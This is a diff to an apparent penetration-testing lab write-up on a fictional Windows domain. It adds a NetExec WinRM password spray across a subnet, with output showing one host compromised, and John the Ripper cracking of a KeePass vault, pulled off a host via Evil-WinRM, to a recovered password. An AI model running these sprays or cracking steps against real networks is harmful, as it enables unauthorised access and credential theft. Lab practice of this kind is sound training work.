@@ -1959,9 +1959,14 @@ SMB         172.16.8.3      445    DC01             [+] INLANEFREIGHT.LOCAL\back
 ```
 
 ```bash
- nxc winrm 172.16.8.50 -u backupadm -p '!qazXSW@'
+ nxc winrm 172.16.8.0/24 -u backupadm -p '!qazXSW@'
+WINRM       172.16.8.3      5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:INLANEFREIGHT.LOCAL) 
+WINRM       172.16.8.20     5985   ACADEMY-AEN-DEV  [*] Windows 10 / Server 2019 Build 17763 (name:ACADEMY-AEN-DEV) (domain:INLANEFREIGHT.LOCAL) 
 WINRM       172.16.8.50     5985   ACADEMY-AEN-MS0  [*] Windows 10 / Server 2019 Build 17763 (name:ACADEMY-AEN-MS0) (domain:INLANEFREIGHT.LOCAL) 
+WINRM       172.16.8.3      5985   DC01             [-] INLANEFREIGHT.LOCAL\backupadm:!qazXSW@
+WINRM       172.16.8.20     5985   ACADEMY-AEN-DEV  [-] INLANEFREIGHT.LOCAL\backupadm:!qazXSW@
 WINRM       172.16.8.50     5985   ACADEMY-AEN-MS0  [+] INLANEFREIGHT.LOCAL\backupadm:!qazXSW@ (Pwn3d!)
+
 ```
 
 ```bash
@@ -2128,6 +2133,25 @@ Info: Downloading C:\\Inlanefreight.kdbx to Inlanefreight.kdbx
                                         
 Info: Download successful!
 *Evil-WinRM* PS C:\> 
+
+```
+
+```
+keepass2john Inlanefreight.kdbx > Inlanefreight.hash
+                                                                                                                                                                                                                                    
+┌──(kali㉿kali)-[~/labs/aen]
+└─$ john Inlanefreight.hash --wordlist=/usr/share/wordlists/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (KeePass [SHA256 AES 32/64])
+Cost 1 (iteration count) is 60000 for all loaded hashes
+Cost 2 (version) is 2 for all loaded hashes
+Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Welcome1         (Inlanefreight)     
+1g 0:00:02:20 DONE (2026-11-14 13:05) 0.007139g/s 288.4p/s 288.4c/s 288.4C/s alfiemoon..Thomas1
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
 
 ```
 
